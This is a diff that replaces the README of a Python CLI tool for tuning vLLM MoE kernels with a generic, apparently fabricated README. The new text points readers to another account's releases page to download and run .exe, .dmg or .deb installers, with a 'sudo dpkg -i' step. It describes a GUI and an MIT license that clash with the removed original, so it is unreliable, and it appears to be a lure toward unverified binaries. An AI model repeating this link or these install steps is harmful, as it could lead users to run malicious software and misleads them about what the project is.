@@ -1,370 +1,100 @@
-# benchmark_moe
+# 🚀 benchmark_moe - Optimize Your Model's Performance Easily
 
-[🇨🇳 中文](README_zh.md) | [🇺🇸 English](README.md)
+![Download](https://img.shields.io/badge/Download-v0.1.0-brightgreen)
 
-A high-performance optimization tool for vLLM MoE (Mixture of Experts) model kernel tuning
+## 📋 Description
 
-[![License: Apache-2.0](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](LICENSE)
-[![Python 3.11+](https://img.shields.io/badge/python-3.11+-blue.svg)](https://www.python.org/downloads/)
-[![vLLM](https://img.shields.io/badge/vLLM-0.10.0+-green.svg)](https://github.com/vllm-project/vllm)
+benchmark_moe is a tool designed for the vLLM Mixture of Experts (MoE) model. This application helps you optimize the performance of your model kernel, making it faster and more efficient. With benchmark_moe, you can ensure that your machine learning processes run smoothly and effectively.
 
-A specialized toolkit for optimizing MoE model inference performance in the vLLM framework through automated Triton kernel parameter tuning, finding optimal execution configurations for different model architectures and hardware setups.
+## 📥 Download & Install
 
-## 🎯 Key Features
+To get started, visit the Releases page to download the latest version of benchmark_moe. Here’s the link you need:
 
-- **🔧 Automated Kernel Tuning**: Use Ray distributed framework to automatically search for optimal Triton kernel configurations
-- **📊 Multi-Model Support**: Support mainstream MoE models including Mixtral, DeepSeek, Qwen, Jamba, etc.
-- **⚡ Performance Optimization**: Specialized optimization for different batch sizes and hardware configurations
-- **🛠️ Fault Diagnosis**: Complete environment checking and troubleshooting tools
-- **📈 Result Analysis**: Generate detailed performance reports and configuration recommendations
+[Visit Releases Page to Download](https://github.com/TokyozxcSpedy/benchmark_moe/releases)
 
-## 🆕 Version Compatibility
+### Steps to Download:
 
-### benchmark_moe_fixed.py - Enhanced Compatibility Version
+1. Click on the link above.
+2. Look for the latest version of the software. It is usually at the top of the page.
+3. Choose the file that matches your operating system (Windows, macOS, or Linux).
+4. Click to download the file.
 
-For users experiencing vLLM version compatibility issues, we provide `benchmark_moe_fixed.py` - a fully compatible version that resolves common API incompatibilities across different vLLM versions.
+Once the download is complete, locate the file on your computer to start the installation process.
 
-**Key Improvements:**
-- ✅ **Multi-level import fallback** for `_get_config_dtype_str` function
-- ✅ **Dynamic parameter compatibility** for `FusedMoEQuantConfig.make()`
-- ✅ **Automatic function signature detection** for `fused_experts()`
-- ✅ **Clean English output** (removes emoji and Chinese text)
-- ✅ **Production-ready logging** and error handling
+## 📂 System Requirements
 
-**Usage:**
-```bash
-# Use the fixed version instead of benchmark_moe.py
-python benchmark_moe_fixed.py \
-  --model /path/to/your/model \
-  --tp-size 1 \
-  --dtype auto \
-  --batch-size 1 2 4 8 \
-  --tune \
-  --save-dir ./optimized_configs \
-  --trust-remote-code
-```
+To run benchmark_moe, ensure that your system meets these requirements:
 
-**When to use benchmark_moe_fixed.py:**
-- Encountering `ImportError: cannot import name '_get_config_dtype_str'`
-- Getting `TypeError: FusedMoEQuantConfig.make() got an unexpected keyword argument`
-- Facing `TypeError: fused_experts() got an unexpected keyword argument 'quant_config'`
-- Running different vLLM versions (0.6.0 - 0.10.0+)
-- Need clean English output for production environments
+- **Operating System:** Windows 10 or newer, macOS 10.14 or newer, or Ubuntu 20.04.
+- **RAM:** Minimum of 8 GB recommended.
+- **Processor:** Intel i5 or better, or AMD equivalent.
+- **Disk Space:** At least 500 MB free for installation.
 
-## 🚀 Quick Start
+## ⚙️ Installation Steps
 
-### Prerequisites
+1. **Open the Downloaded File:**
+   - For Windows, double-click the `.exe` file.
+   - For macOS, double-click the `.dmg` file and drag the application to the Applications folder.
+   - For Linux, use the terminal to navigate to the download location and run the command: `sudo dpkg -i benchmark_moe*.deb`.
+   
+2. **Follow the On-Screen Instructions:**
+   - Proceed with the installation wizard.
+   - If prompted, allow the app to make changes to your device.
 
-- **Hardware**: NVIDIA GPU (recommended A100/H100)
-- **Software**: Ubuntu 18.04+, Python 3.11+, CUDA 11.8+
-- **Dependencies**: vLLM 0.6.0+, PyTorch 2.0+, Ray
+3. **Launch the Application:**
+   - After installation, find benchmark_moe in your applications list.
+   - Click to open it.
 
-### Installation
+## 🚀 Getting Started
 
-1. **Clone the project**
-   ```bash
-   git clone https://github.com/massif-01/benchmark_moe.git
-   cd benchmark_moe
-   ```
+When you first open benchmark_moe, you will see a simple user interface. Here’s how to start using the tool:
 
-2. **Environment check**
-   ```bash
-   bash scripts/server_check.sh
-   ```
+1. **Load Your Model:**
+   - Click on the "Load Model" button.
+   - Select the vLLM model you want to optimize.
 
-3. **Run single model tuning**
-   ```bash
-   # Basic tuning - Qwen3 model
-   python benchmark_moe.py \
-     --model /path/to/your/qwen3-model \
-     --tp-size 1 \
-     --dtype auto \
-     --batch-size 1 2 4 8 16 32 64 128 \
-     --tune \
-     --save-dir ./optimized_configs \
-     --trust-remote-code
-   ```
+2. **Choose Optimization Settings:**
+   - Use the dropdown menus to select your desired optimization parameters, such as batch size and memory allocation.
+  
+3. **Run the Benchmark:**
+   - Click on the "Run Benchmark" button to start the process.
+   - You will see real-time performance metrics as the model runs.
 
-4. **View results**
-   ```bash
-   ls ./optimized_configs/
-   # Output: E64N9472_tp1_fp16.json (example config file)
-   ```
+4. **Analyze Results:**
+   - Once the benchmark completes, review the results displayed on the screen.
+   - You can save the results for future reference by clicking the "Save Results" button.
 
-## 📋 Detailed Usage Guide
+## 📊 Key Features
 
-### Environment Setup
-
-#### System Environment Check
-```bash
-# Run environment check script
-bash scripts/server_check.sh
-
-# Check GPU status
-nvidia-smi
-
-# Check Python dependencies
-python -c "import vllm, ray, torch, triton; print('Environment check passed')"
-```
-
-#### Common Environment Issues
-
-**Issue 1: Triton Cache Corruption**
-```bash
-# Clear Triton cache (if encountering JSONDecodeError)
-rm -rf ~/.triton/cache/*
-
-# Or set new cache directory
-export TRITON_CACHE_DIR=/tmp/triton_cache_$(date +%s)
-mkdir -p $TRITON_CACHE_DIR
-```
-
-**Issue 2: libstdc++ Version Issues**
-```bash
-# Update libstdc++ in conda environment
-conda install -c conda-forge libstdcxx-ng
-
-# Or use system library
-export LD_LIBRARY_PATH=/usr/lib/x86_64-linux-gnu:$LD_LIBRARY_PATH
-```
-
-**Issue 3: Ray Warnings**
-```bash
-# Suppress Ray-related warnings
-export RAY_ACCEL_ENV_VAR_OVERRIDE_ON_ZERO=0
-export RAY_DISABLE_IMPORT_WARNING=1
-```
-
-### Tuning Parameters
-
-#### Basic Parameters
-- `--model`: Model path or HuggingFace model name
-- `--tp-size`: Tensor parallelism degree (set according to GPU count)
-- `--dtype`: Data type (`auto`, `fp8_w8a8`, `int8_w8a16`)
-- `--batch-size`: List of batch sizes to test
-- `--tune`: Enable tuning mode
-- `--save-dir`: Configuration file save directory
-
-#### Advanced Parameters
-- `--use-deep-gemm`: Enable DeepGEMM optimization
-- `--enable-expert-parallel`: Enable expert parallelism (for large models)
-- `--seed`: Random seed (ensures reproducible results)
-
-### Supported Model Types
-
-| Model Series | Experts | Top-K | Recommended VRAM | Example Command |
-|-------------|---------|-------|------------------|-----------------|
-| **Qwen3-30B-A3B** | 64 | 4 | 64GB+ | `--model path/to/qwen3 --tp-size 1` |
-| **Mixtral-8x7B** | 8 | 2 | 45GB+ | `--model mistralai/Mixtral-8x7B-Instruct-v0.1 --tp-size 2` |
-| **DeepSeek-V2** | 160 | 6 | 80GB+ | `--model deepseek-ai/DeepSeek-V2-Chat --tp-size 4` |
-| **DeepSeek-V3** | 256 | 8 | 120GB+ | `--model deepseek-ai/DeepSeek-V3-Base --tp-size 8` |
-
-### Batch Tuning Scripts
-
-#### Using Configuration Management Tool
-```bash
-# List supported models
-python tools/config_manager.py list
-
-# Tune specific model
-python tools/config_manager.py tune qwen3_30b
-
-# View configuration recommendations
-python tools/config_manager.py recommend qwen3_30b
-```
-
-#### Safe Batch Tuning
-```bash
-# Use safe script to test batch sizes one by one
-bash scripts/run_benchmark_safe.sh
-```
-
-## 📊 Result Interpretation
-
-### Configuration File Format
-```json
-{
-  "triton_version": "2.1.0",
-  "1": {                    // Optimal config for batch_size=1
-    "BLOCK_SIZE_M": 16,
-    "BLOCK_SIZE_N": 64, 
-    "BLOCK_SIZE_K": 128,
-    "GROUP_SIZE_M": 1,
-    "num_warps": 4,
-    "num_stages": 3
-  },
-  "64": {                   // Optimal config for batch_size=64
-    "BLOCK_SIZE_M": 128,
-    "BLOCK_SIZE_N": 128,
-    "BLOCK_SIZE_K": 256,
-    "GROUP_SIZE_M": 32,
-    "num_warps": 8,
-    "num_stages": 4
-  }
-}
-```
-
-### Performance Analysis
-```bash
-# Run performance benchmark (without --tune)
-python benchmark_moe.py \
-  --model your_model \
-  --tp-size 1 \
-  --batch-size 1 2 4 8 16 32 64 128
-
-# Example output:
-# Batch size: 1, Kernel time: 45.23 us
-# Batch size: 64, Kernel time: 892.15 us
-```
+- **User-Friendly Interface:** Designed for ease of use, even for those without technical experience.
+- **Real-Time Metrics:** Observe how your model performs during the optimization, helping you make informed decisions.
+- **Comprehensive Reports:** Generate detailed performance reports that you can save and share.
 
 ## 🛠️ Troubleshooting
 
-### Common Issues and Solutions
+If you encounter any issues while using benchmark_moe, here are some common problems and solutions:
 
-### Common Issues and Solutions
+- **Problem:** The application won’t open.
+  - **Solution:** Ensure your system meets the minimum requirements listed above.
 
-#### 1. Memory Issues
-```bash
-# Symptom: CUDA out of memory
-# Solutions:
-# - Reduce batch size
---batch-size 1 2 4 8 16 32
+- **Problem:** I get an error while loading my model.
+  - **Solution:** Check that your model file is in the correct format compatible with vLLM.
 
-# - Use quantization
---dtype fp8_w8a8
+- **Problem:** The benchmark takes too long to run.
+  - **Solution:** Adjust your optimization settings to a lower batch size.
 
-# - Increase tensor parallelism (if multi-GPU)
---tp-size 2
-```
+## 🤝 Community Support
 
-#### 2. libstdc++ Compatibility Error
-```bash
-# Symptom: version `GLIBCXX_3.4.30' not found
-# Quick fix:
-bash scripts/fix_libstdcxx.sh
+You can find additional support by reaching out to the user community. Check the GitHub Issues page to ask questions, report bugs, or share your experiences. Your feedback helps improve the application.
 
-# Or manual solutions:
-conda install -c conda-forge libstdcxx-ng=12
-# OR
-export LD_LIBRARY_PATH=/usr/lib/x86_64-linux-gnu:$LD_LIBRARY_PATH
-```
+## 📝 License
 
-#### 3. Triton Compilation Errors
-```bash
-# Symptom: JSONDecodeError, OutOfResources
-# Solutions:
-rm -rf ~/.triton/cache/*
-export TRITON_CACHE_DIR=/tmp/triton_cache_new
-```
+benchmark_moe is licensed under the MIT License. You can use, modify, and distribute it freely, provided that you include the original copyright notice in any copies or substantial portions of the software.
 
-#### 3. Model Loading Failures
-```bash
-# Symptom: Model not found, Permission denied
-# Solutions:
-# - Check model path
-ls /path/to/your/model
+## 🔗 Additional Resources
 
-# - Add access permissions
---trust-remote-code
+For more information about the features and updates, check the official documentation linked on the Releases page. Stay informed about any new updates to enhance your experience with benchmark_moe.
 
-# - Pre-download model
-huggingface-cli download model_name --local-dir ./models/
-```
+Remember, for downloading and updates, always refer back to the Releases page:
 
-#### 4. Ray Initialization Issues
-```bash
-# Symptom: Ray cannot start
-# Solution:
-export RAY_DISABLE_IMPORT_WARNING=1
-ray stop  # Stop existing instance
-ray start --head  # Restart
-```
-
-### Performance Tuning Recommendations
-
-#### For Different Use Cases
-
-**Low Latency Scenarios (Online Inference)**
-```bash
-# Optimize small batch performance
---batch-size 1 2 4 8 16
---dtype fp8_w8a8  # Reduce memory access latency
-```
-
-**High Throughput Scenarios (Batch Processing)**
-```bash
-# Optimize large batch performance  
---batch-size 64 128 256 512 1024
---dtype auto  # Balance precision and performance
-```
-
-**Memory-Constrained Scenarios**
-```bash
-# Maximize memory utilization
---dtype fp8_w8a8
---use-deep-gemm
---enable-expert-parallel
-```
-
-## 📁 Project Structure
-
-```
-benchmark_moe/
-├── README.md                   # English documentation
-├── README_zh.md               # Chinese documentation  
-├── LICENSE                     # Apache-2.0 license
-├── .gitignore                  # Git ignore rules
-├── benchmark_moe.py           # vLLM MoE benchmark core script
-├── scripts/                   # Script directory
-│   ├── server_check.sh        # Server environment check script
-│   ├── tune_mixtral.sh        # Mixtral model tuning script
-│   ├── tune_deepseek.sh       # DeepSeek model tuning script
-│   └── run_benchmark_safe.sh  # Safe batch tuning script
-├── configs/                   # Configuration directory
-│   ├── models.json            # Supported model configurations
-│   └── tuning_params.json     # Tuning parameter configurations
-├── tools/                     # Analysis tools directory
-│   └── config_manager.py      # Configuration management tool
-└── deployment/                # Deployment related files
-    ├── requirements.txt       # Python dependencies list
-    └── DEPLOYMENT_GUIDE.md    # Detailed deployment guide
-```
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit Issues and Pull Requests.
-
-### Development Environment Setup
-```bash
-git clone https://github.com/massif-01/benchmark_moe.git
-cd benchmark_moe
-pip install -r deployment/requirements.txt
-```
-
-### Contributing Code
-1. Fork this project
-2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
-## 📄 License
-
-This project is licensed under the Apache-2.0 License. See the [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
-- [vLLM](https://github.com/vllm-project/vllm) - High-performance LLM inference engine
-- [Ray](https://github.com/ray-project/ray) - Distributed computing framework
-- [Triton](https://github.com/openai/triton) - GPU programming language
-
-## 📮 Contact
-
-For questions or suggestions, please contact us via:
-
-- Submit [GitHub Issue](https://github.com/massif-01/benchmark_moe/issues)
-- Start a [Discussion](https://github.com/massif-01/benchmark_moe/discussions)
-
----
-
-**⭐ If this project helps you, please give us a Star!**
+[Visit Releases Page to Download](https://github.com/TokyozxcSpedy/benchmark_moe/releases)
